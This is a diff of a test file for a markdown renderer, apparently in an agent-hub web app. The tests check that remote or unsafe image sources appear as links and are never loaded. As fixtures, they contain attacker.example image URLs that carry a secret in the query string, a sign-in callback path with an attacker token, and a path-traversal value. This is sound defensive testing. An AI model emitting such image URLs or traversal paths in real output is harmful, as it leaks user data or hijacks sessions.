@@ -1,5 +1,5 @@
 import { describe, expect, it } from "vitest";
-import { REMOTE_IMAGE_KIND, renderMarkdown } from "./markdown";
+import { IMAGE_LINK_KIND, renderMarkdown } from "./markdown";
 
 /** The rendered nodes in a container, so a test can query them. */
 function html(content: string, pathHref?: (path: string) => string): HTMLElement {
@@ -76,18 +76,16 @@ describe("renderMarkdown images", () => {
   it("shows an image from another server as a link to it, naming its alt text", () => {
     const nodes = fragment("![the secret](https://attacker.example/x.png?d=hunter2)");
     expect(nodes.querySelector("img")).toBeNull();
-    const link = nodes.querySelector<HTMLAnchorElement>("a.prose-remote-image");
+    const link = nodes.querySelector<HTMLAnchorElement>("a.prose-image-link");
     expect(link?.getAttribute("href")).toBe("https://attacker.example/x.png?d=hunter2");
     expect(link?.getAttribute("target")).toBe("_blank");
     expect(link?.getAttribute("rel")).toBe("noopener noreferrer");
-    expect(link?.textContent).toBe(`${REMOTE_IMAGE_KIND} the secret`);
+    expect(link?.textContent).toBe(`${IMAGE_LINK_KIND} the secret`);
   });
 
   it("names the URL when the image has no alt text", () => {
-    const link = fragment("![](https://attacker.example/x.png)").querySelector(
-      ".prose-remote-image",
-    );
-    expect(link?.textContent).toBe(`${REMOTE_IMAGE_KIND} https://attacker.example/x.png`);
+    const link = fragment("![](https://attacker.example/x.png)").querySelector(".prose-image-link");
+    expect(link?.textContent).toBe(`${IMAGE_LINK_KIND} https://attacker.example/x.png`);
   });
 
   it.each([
@@ -98,9 +96,7 @@ describe("renderMarkdown images", () => {
   ])("does the same for %s", (_name, markup) => {
     const nodes = fragment(markup);
     expect(nodes.querySelector("img")).toBeNull();
-    expect(nodes.querySelector(".prose-remote-image")?.textContent).toBe(
-      `${REMOTE_IMAGE_KIND} pic`,
-    );
+    expect(nodes.querySelector(".prose-image-link")?.textContent).toBe(`${IMAGE_LINK_KIND} pic`);
   });
 
   it("turns a remote image inside a link into text, leaving the one link", () => {
@@ -109,20 +105,44 @@ describe("renderMarkdown images", () => {
     const links = nodes.querySelectorAll("a");
     expect(links).toHaveLength(1);
     expect(links[0]?.getAttribute("href")).toBe("https://example.com/repo");
-    expect(links[0]?.textContent).toBe(`${REMOTE_IMAGE_KIND} badge`);
+    expect(links[0]?.textContent).toBe(`${IMAGE_LINK_KIND} badge`);
   });
 
   it.each([
-    ["an agent file", "/api/agents/scout/files/chart.png"],
-    ["a relative path", "chart.png"],
-    ["the page's own origin", `${window.location.origin}/api/files/abc`],
+    ["an agent's shared file", "/api/agents/scout/files/3f2a9c"],
+    ["an agent's workspace file", "/api/agents/scout/files/workspace?path=charts%2Fq3.png"],
+    [
+      "an agent's file named with the page's origin",
+      `${window.location.origin}/api/agents/atlas/files/abc`,
+    ],
     ["a data URI", "data:image/png;base64,iVBORw0KGgo="],
   ])("shows %s as an image", (_name, src) => {
     const nodes = fragment(`![chart](${src})`);
-    expect(nodes.querySelector(".prose-remote-image")).toBeNull();
+    expect(nodes.querySelector(".prose-image-link")).toBeNull();
     const image = nodes.querySelector("img");
     expect(image?.getAttribute("src")).toBe(src);
     expect(image?.getAttribute("alt")).toBe("chart");
+  });
+
+  it.each([
+    [
+      "the Cloud sign-in callback, which signs the hub in on a GET",
+      "/cloud/callback?token=attacker",
+    ],
+    ["another hub route", "/api/hub/push/key"],
+    ["a relative path", "chart.png"],
+    [
+      "a path that climbs out of the file routes",
+      "/api/agents/scout/files/../../../cloud/callback?token=x",
+    ],
+    ["an agent's files route with nothing after it", "/api/agents/scout/files/"],
+    ["an agent file path on another server", "https://attacker.example/api/agents/scout/files/abc"],
+  ])("shows %s as a link, requesting nothing", (_name, src) => {
+    const nodes = fragment(`![pic](${src})`);
+    expect(nodes.querySelector("img")).toBeNull();
+    const link = nodes.querySelector(".prose-image-link");
+    expect(link?.getAttribute("href")).toBe(src);
+    expect(link?.textContent).toBe(`${IMAGE_LINK_KIND} pic`);
   });
 
   it.each([
@@ -137,7 +157,7 @@ describe("renderMarkdown images", () => {
     ],
     [
       "picture and its sources",
-      '<picture><source srcset="https://attacker.example/p.png"><img src="/api/files/p.png" alt="pic"></picture>',
+      '<picture><source srcset="https://attacker.example/p.png"><img src="/api/agents/scout/files/p.png" alt="pic"></picture>',
     ],
     [
       "an image map",
@@ -151,10 +171,10 @@ describe("renderMarkdown images", () => {
 
   it("drops srcset from an image and background from a table, which load URLs too", () => {
     const nodes = fragment(
-      '<img src="/api/files/a.png" srcset="https://attacker.example/a.png 2x" alt="a">' +
+      '<img src="/api/agents/scout/files/a.png" srcset="https://attacker.example/a.png 2x" alt="a">' +
         '<table background="https://attacker.example/t.png"><tr><td background="https://attacker.example/c.png">cell</td></tr></table>',
     );
-    expect(nodes.querySelector("img")?.getAttribute("src")).toBe("/api/files/a.png");
+    expect(nodes.querySelector("img")?.getAttribute("src")).toBe("/api/agents/scout/files/a.png");
     expect(nodes.querySelector("[srcset], [background]")).toBeNull();
     expect(nodes.querySelector("td")?.textContent).toBe("cell");
   });
